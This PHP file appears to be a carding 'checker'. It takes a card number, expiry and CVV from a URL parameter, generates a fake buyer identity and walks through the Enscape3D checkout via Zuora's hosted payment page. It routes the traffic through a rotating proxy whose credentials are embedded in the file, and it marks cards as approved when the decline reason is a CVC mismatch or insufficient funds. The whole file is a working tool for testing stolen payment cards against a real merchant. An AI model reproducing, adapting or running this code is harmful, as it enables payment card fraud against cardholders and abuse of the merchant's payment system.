<?php

////////////// ENCRYPT ZUORA*CHASE /////////////////////////////////////
function encrypt_data($Data, $fieldKey)
{
    $i = explode("|", $Data);
    $cc = $i[0];
    $mes = $i[1];
    $ano = $i[2];
    $cvv = $i[3];

    $ipRan = rand(0, 255).'.'.rand(0, 255).'.'.rand(0, 255).'.'.rand(0, 255);
    $fieldToEncrypt = "#$ipRan#$cc#$cvv#$mes#$ano";
    $formattedPublicKey = "-----BEGIN PUBLIC KEY-----\n$fieldKey\n-----END PUBLIC KEY-----";

    $base64EncodedData = base64_encode($fieldToEncrypt);

    $publicKey = openssl_pkey_get_public($formattedPublicKey);
    if ($publicKey === false) {
        throw new Exception('Invalid public key.');
    }

    if (!openssl_public_encrypt($base64EncodedData, $encryptedData, $publicKey)) {
        throw new Exception('Encryption failed: ' . openssl_error_string());
    }

    $base64EncryptedData = base64_encode($encryptedData);

    openssl_free_key($publicKey);

    return $base64EncryptedData;
}

function findBetween($text, $start, $end) {
$startPos = strpos($text, $start);
if ($startPos === false) {
return '';
}
$startPos += strlen($start);
$endPos = strpos($text, $end, $startPos);
if ($endPos === false) {
return '';
}
return substr($text, $startPos, $endPos - $startPos);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
  }

function obtenerDatosRandomUser() {
    $apiUrl = "https://randomuser.me/api/";
    $response = file_get_contents($apiUrl);
    $data = json_decode($response, true);
    return $data['results'][0];
}

$randomUserApi = obtenerDatosRandomUser();

$email = $randomUserApi['email'];
$nombre = $randomUserApi['name']['first'] . ' ' . $randomUserApi['name']['last'];
$ship_fname = $randomUserApi['name']['first'];
$ship_lname = $randomUserApi['name']['last'];
$ship_street = $randomUserApi['location']['street']['number'] . ' ' . $randomUserApi['location']['street']['name'];
$ship_city = $randomUserApi['location']['city'];
$ship_state = $randomUserApi['location']['state'];
$ship_zip = $randomUserApi['location']['postcode'];
$ship_country = 'US'; 
$ship_phone = $randomUserApi['phone'];

$card = $_GET['card']; 

// Configuración de proxy
$proxy = "http://rvrqudhp-rotate:918d6xnqwql1@p.webshare.io:80";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://enscape3d.com/pricing/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: es-419,es;q=0.5',
    'priority: u=0, i',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ssogateway.enscape3d.com/api/v1/session');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: es-419,es;q=0.5',
    'origin: https://enscape3d.com',
    'priority: u=1, i',
    'referer: https://enscape3d.com/',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://orders.enscape3d.com/api/v1/webshop/cart/product');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: es-419,es;q=0.5',
    'content-type: application/json',
    'origin: https://enscape3d.com',
    'priority: u=1, i',
    'referer: https://enscape3d.com/',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"ratePlan":"2c92a0fe5b89d601015ba02fcdc912be","quantity":1}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://orders.enscape3d.com/api/v1/webshop/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'OPTIONS');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: es-419,es;q=0.9',
    'access-control-request-headers: content-type',
    'access-control-request-method: PATCH',
    'origin: https://enscape3d.com',
    'priority: u=1, i',
    'referer: https://enscape3d.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://orders.enscape3d.com/api/v1/webshop/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: es-419,es;q=0.5',
    'content-type: application/json',
    'origin: https://enscape3d.com',
    'priority: u=1, i',
    'referer: https://enscape3d.com/',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'"}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://buy-sso.enscape3d.com/api/payment/page-signature/2c92a0fe75e3c7200175f9dbafe966ab');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'accept-language: es-419,es;q=0.5',
    'origin: https://enscape3d.com',
    'priority: u=1, i',
    'referer: https://enscape3d.com/',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$json_data = json_decode($response, true);

$signature = $json_data['signature'];
$token = $json_data['token'];
$tenantId = $json_data['tenantId'];
$key = $json_data['key'];
$success = $json_data['success'];
$encoded_text = $signature;
$encoded_text = str_replace('/', '%2F', $encoded_text);
$encoded_text = str_replace('+', '%2B', $encoded_text);
$encoded_text = str_replace('=', '%3D', $encoded_text);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.zuora.com/apps/PublicHostedPageLite.do?method=requestPage&host=https%3A%2F%2Fenscape3d.com%2Fpricing%2F&fromHostedPage=true&signature='.$encoded_text.'&token='.$token.'&tenantId='.$tenantId.'&style=inline&id=2c92a0fe75e3c7200175f9dbafe966ab&submitEnabled=true&locale=en&authorizationAmount=2700.53&field_currency=USD&customizeErrorRequired=true&zlog_level=warn');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: es-419,es;q=0.5',
    'priority: u=0, i',
    'referer: https://enscape3d.com/',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: iframe',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: cross-site',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

$response = curl_exec($ch);

$field_key = findBetween($response,'"field_key" value="','"');
$signature2 = findBetween($response,'id="signature" value="','"');
$encoded_text = $signature2;
$encoded_text = str_replace('/', '%2F', $encoded_text);
$encoded_text = str_replace('+', '%2B', $encoded_text);
$encoded_text = str_replace('=', '%3D', $encoded_text);
$token2 = findBetween($response,'id="token" value="','"');
$xjd28s_6sk = findBetween($response,'id="xjd28s_6sk" value="','"');
$pklive = findBetween($response,'id="stripePublishableKey" value="','"');

$encrypt_zoura = encrypt_data($card, 
"$field_key");

$ty = ['4'=>'Visa','5'=>'MasterCard','3'=>'AmericanExpress','6'=> 'Discover'];
$typercr = $ty[substr($cc, 0,1)];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.zuora.com/apps/PublicHostedPageLite.do');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: es-419,es;q=0.5',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.zuora.com',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/chazecok.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/chazecok.txt'); 

// Configurar proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'method=submitPage&id=2c92a0fe75e3c7200175f9dbafe966ab&tenantId='.$tenantId.'&token='.$token2.'&signature='.$encoded_text.'&paymentGateway=&field_authorizationAmount=2700.53&field_screeningAmount=&field_currency=USD&field_key='.$field_key.'&field_style=inline&jsVersion=&field_submitEnabled=true&field_signatureType=&host=https%3A%2F%2Fenscape3d.com%2Fpricing%2F&encrypted_fields=%23field_ipAddress%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear&encrypted_values='.urlencode($encrypt_zoura).'&customizeErrorRequired=true&fromHostedPage=true&isGScriptLoaded=false&is3DSEnabled=&checkDuplicated=&captchaRequired=&captchaSiteKey=&field_mitConsentAgreementSrc=&field_mitConsentAgreementRef=&field_mitCredentialProfileType=&field_agreementSupportedBrands=&paymentGatewayType=Stripe&paymentGatewayVersion=2&is3DS2Enabled=true&cardMandateEnabled=false&zThreeDs2TxId=&threeDs2token=&threeDs2Sig=&threeDs2Ts=&threeDs2OnStep=&threeDs2GwData=&doPayment=&storePaymentMethod=&documents=&xjd28s_6sk='.$xjd28s_6sk.'&pmId=&button_outside_force_redirect=false&field_passthrough1=&field_passthrough2=&field_passthrough3=&field_passthrough4=&field_passthrough5=&field_passthrough6=&field_passthrough7=&field_passthrough8=&field_passthrough9=&field_passthrough10=&field_passthrough11=&field_passthrough12=&field_passthrough13=&field_passthrough14=&field_passthrough15=&stripePublishableKey='.$pklive.'&isRSIEnabled=false&radarSessionId=&field_accountId=&field_gatewayName=&field_deviceSessionId=&field_ipAddress=&field_useDefaultRetryRule=&field_paymentRetryWindow=&field_maxConsecutivePaymentFailures=&field_creditCardNumber=&field_creditCardType=Visa&field_creditCardHolderName=Jose+andres+Garces+Felipe&field_creditCardExpirationMonth=&field_creditCardExpirationYear=&field_cardSecurityCode=&encodedZuoraIframeInfo=eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6MzIxLCJmb3JtSGVpZ2h0IjozOTIsImxheW91dFN0eWxlIjoiYnV0dG9uSW5zaWRlIiwienVvcmFKc1ZlcnNpb24iOiIiLCJmb3JtRmllbGRzIjpbeyJpZCI6ImZvcm0tZWxlbWVudC1jcmVkaXRDYXJkVHlwZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZE51bWJlciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEV4cGlyYXRpb25ZZWFyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkSG9sZGVyTmFtZSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZENvdW50cnkiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRTdGF0ZSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEFkZHJlc3MxIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQWRkcmVzczIiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDaXR5IiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkUG9zdGFsQ29kZSIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfSx7ImlkIjoiaW5wdXQtcGhvbmUiLCJleGlzdHMiOmZhbHNlLCJpc0hpZGRlbiI6dHJ1ZX0seyJpZCI6ImlucHV0LWVtYWlsIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9XX0%3D');

$curl = curl_exec($ch);
$errorMessage = trim(getStr(urldecode($curl), '"errorMessage":"', '"'));
$jsonArray = json_decode($curl, true);
$authorizeResult = $jsonArray['AuthorizeResult'];

$response = $errorMessage; 

if (strpos($response, "Your card's security code is incorrect.") !== false) {
$status1 = "Transaction declined.402 - [card_error/incorrect_cvc] CVV2 Mismatcht.";
$status2 = "⁣¡Aprobada! ✅";
} elseif (strpos($response, "Transaction declined.402 - [card_error/card_declined/generic_decline] Insufficient Funds.") !== false) {
$status1 = "Transaction declined.402 - [card_error/incorrect_cvc] Insufficient Funds.";
$status2 = "⁣¡Aprobada! ✅";
}  else {
$status1 = "Transaction declined.402 - [card_error/card_declined/generic_decline] Declined Card.";
$status2 = "⁣Declined! ❌";
}

    $responseArray = array(
        "status1" => $status1,
        "status2" => str_replace("\u2063", "", $status2)
    );
    
    header('Content-Type: application/json');
    
    echo json_encode($responseArray);
?>

